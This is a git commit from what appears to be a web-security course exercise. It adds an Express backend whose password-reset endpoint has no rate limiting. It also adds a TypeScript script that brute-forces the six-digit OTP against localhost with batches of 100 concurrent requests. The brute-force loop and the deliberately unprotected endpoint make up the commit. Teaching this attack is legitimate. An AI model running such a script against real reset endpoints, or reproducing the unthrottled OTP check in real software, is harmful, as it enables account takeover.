acb806c5c7a80146fcdc4f996df922bf9f41cbc0
Vishal Singh <vishalsinghpanwar02@gmail.com>
2025-04-18 23:09:08 +0530

    DDoS start

---
+++ 1-100 cohort/Week 21/21.1/pen-testing/attack/src/index.ts
@@ -0,0 +1,42 @@
+import axios from "axios";
+ 
+//function to send a request to the server
+async function sendRequest(otp: number) {
+  let data = JSON.stringify({
+    "email": "vishal@gmail.com",
+    "otp": otp,
+    "newPassword": "123123123"
+  });
+
+  let config = {
+    method: 'post',
+    maxBodyLength: Infinity,
+    url: 'http://localhost:3000/reset-password',
+    headers: { 
+      'Content-Type': 'application/json'
+    },
+    data: data
+  };
+
+  try {
+    await axios.request(config)
+    console.log("done for " + otp);
+  } catch (e) {
+    //console.log('Error: ', e);
+  }
+}
+
+//calling the function in a loop to send multiple requests
+async function main() {
+  for (let i = 0; i < 1000000; i += 100) {
+    const promises = [];
+  
+    //sending in a batch of 100 requests
+    for (let j = 0; j < 100; j++) {
+      promises.push(sendRequest(i + j))
+    }
+    await Promise.all(promises);
+  }
+}
+
+main();
---
+++ 1-100 cohort/Week 21/21.1/pen-testing/backend/src/index.ts
@@ -0,0 +1,44 @@
+import express from 'express';
+
+const app = express();
+const PORT = 3000;
+
+app.use(express.json());
+
+// Store OTPs in a simple in-memory object
+const otpStore: Record<string, string> = {};
+//const otpStore: {[key: string]: string} = {}; also works
+
+// Endpoint to generate and log OTP
+// @ts-ignore
+app.post('/generate-otp', (req, res) => {
+  const email = req.body.email;
+  if (!email) {
+    return res.status(400).json({ message: "Email is required" });
+  }
+  const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
+  otpStore[email] = otp;
+
+  console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console but ideally we should send the otp to user's email here
+  res.status(200).json({ message: "OTP generated and logged" });
+});
+
+// Endpoint to reset password
+// @ts-ignore
+app.post('/reset-password', (req, res) => {
+  const { email, otp, newPassword } = req.body;
+  if (!email || !otp || !newPassword) {
+    return res.status(400).json({ message: "Email, OTP, and new password are required" });
+  }
+  if (otpStore[email] === otp) {
+    console.log(`Password for ${email} has been reset to: ${newPassword}`); //ideally here is where we would write logic to reset password in the db
+    delete otpStore[email]; // Clear the OTP after use
+    res.status(200).json({ message: "Password has been reset successfully" });
+  } else {
+    res.status(401).json({ message: "Invalid OTP" });
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
+});
